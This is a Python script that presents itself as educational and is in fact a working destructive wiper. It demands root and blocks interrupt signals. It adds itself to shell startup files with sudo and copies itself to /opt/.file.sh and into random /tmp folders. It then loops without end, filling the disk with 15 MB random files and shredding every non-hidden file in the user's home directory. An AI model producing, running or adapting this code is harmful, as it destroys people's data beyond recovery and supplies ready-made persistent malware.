import os
import random
import string
import shutil
import signal
import subprocess
import sys
import tempfile
from pathlib import Path

def signal_handler(signum, frame):
    print(f"Signal {signum} received. Please do not stop the script while it is running.")

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def check_sudo_permissions():
    if os.geteuid() != 0:
        print("This script must be run with sudo permissions.")
        sys.exit(1)

def check_zenity_installation():
    try:
        subprocess.run(['zenity', '--version'], check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("WARNING: This software is for educational purposes only.\nRunning this script will create random files, replicate itself, and corrupt non-system files.\n\n""Proceeding can cause data loss and system instability. Do you want to continue?")
        answ = input("Y / N")
        if answ == "Y" or answ == "y":
            print("No turning back now...")
        else:
            exit()

def show_warning():
    warning_message = (
        "WARNING: This software is for educational purposes only. "
        "Running this script will create random files, replicate itself, and corrupt non-system files.\n\n"
        "Proceeding can cause data loss and system instability. Do you want to continue?"
    )
    zenity_command = [
        "zenity", "--warning", "--text", warning_message, "--title", "Warning",
        "--ok-label", "Run Script", "--cancel-label", "Exit"
    ]
    try:
        result = subprocess.run(zenity_command, capture_output=True)
        if result.returncode != 0:
            print("Exiting...")
            sys.exit(0)
    except FileNotFoundError:
        print("WARNING: This software is for educational purposes only.\nRunning this script will create random files, replicate itself, and corrupt non-system files.\n\n""Proceeding can cause data loss and system instability. Do you want to continue?")
        answ = input("Y / N")
        if answ == "Y" or answ == "y":
            print("No turning back now...")
        else:
            exit()
    
def generate_random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '.bin'

def create_random_file(filename, size_mb):
    size_bytes = size_mb * 1024 * 1024  # Convert MB to bytes
    with open(filename, 'wb') as f:
        f.write(os.urandom(size_bytes))

def replicate_script():
    script_path = os.path.realpath(__file__)
    try:
        subprocess.run(['sudo', 'cp', script_path, '/opt/.file.sh'], check=True)
        print("Copied script to /opt/.file.sh")
    except subprocess.CalledProcessError:
        print("Failed to copy to /opt/.file.sh")

    for _ in range(5): #change this for more or less copies
        random_dir = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        random_path = os.path.join('/tmp', random_dir)
        os.makedirs(random_path, exist_ok=True)
        destination_path = os.path.join(random_path, os.path.basename(script_path))
        shutil.copy(script_path, destination_path)
        
def add_to_startup():
    script_path = os.path.realpath(__file__)
    home_dir = str(Path.home())
    startup_file = None
    #finds the right startup file
    if os.path.isfile(os.path.join(home_dir, '.bashrc')):
        startup_file = os.path.join(home_dir, '.bashrc')
    elif os.path.isfile(os.path.join(home_dir, '.zshrc')):
        startup_file = os.path.join(home_dir, '.zshrc')
    elif os.path.isfile(os.path.join(home_dir, '.profile')):
        startup_file = os.path.join(home_dir, '.profile')
    
    if startup_file:
        with open(startup_file, 'a') as f:
            f.write(f'\n# DO NOT DISABLE THE FOLLOWING LINE\nsudo python3 {script_path} &\n')
    else:
        print("No startup file found.")

def shred_non_system_files():
    home_dir = str(Path.home())
    for root, dirs, files in os.walk(home_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                #do not shred .term files
                if not any(part.startswith('.') for part in Path(file_path).parts) and not file.endswith('.term'):
                    subprocess.run(['shred', '-n', '3', '-u', file_path], check=True)
                    print(f"Shredded file: {file_path}")
            except subprocess.CalledProcessError:
                print(f"Failed to shred file: {file_path}")

def start_progress_bar(pipe_path):
    """Starts the zenity progress bar."""
    zenity_command = [
        "zenity", "--progress", "--pulsate", "--auto-close", "--no-cancel", 
        "--title", "Running Script", "--text", "The script is running. Please wait..."
    ]
    with open(pipe_path, 'w') as pipe:
        try:
            subprocess.run(zenity_command, stdin=pipe)
        except FileNotFoundError:
            print("zenity not found!")

def main():
    check_sudo_permissions()
    check_zenity_installation()
    show_warning()

    #making a named pipe
    pipe_path = os.path.join(tempfile.gettempdir(), "script_pipe")
    if not os.path.exists(pipe_path):
        os.mkfifo(pipe_path)

    progress_bar_process = subprocess.Popen(['python3', '-c', 
        'import sys; from script import start_progress_bar; start_progress_bar(sys.argv[1])', pipe_path])

    size_mb = 15  #the size of each file in mb
    add_to_startup()
    while True:
        random_number = random.randint(1, 1000000)
        print(f"Generated random number: {random_number}")
        
        filename = generate_random_filename()
        print(f"Creating file: {filename}")
        
        create_random_file(filename, size_mb)
        print(f"Created {size_mb}MB file: {filename}")
        

        replicate_script()
        
        shred_non_system_files()

if __name__ == "__main__":
    main()
